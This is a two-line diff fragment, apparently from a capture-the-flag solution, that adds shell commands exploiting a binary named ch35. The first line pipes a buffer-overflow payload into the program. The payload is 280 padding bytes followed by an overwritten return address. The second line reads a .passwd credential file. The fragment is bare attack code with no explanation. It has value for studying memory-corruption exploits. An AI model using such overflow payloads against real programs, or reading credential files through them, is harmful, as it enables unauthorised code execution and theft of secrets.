@@ -1,0 +1,2 @@
+python -c "print ('A'*280 + '\xcd\x06\x40\x00\x00\x00\x00\x00')" > /tmp/lol && cat /tmp/lol - | ./ch35
+cat .passwd
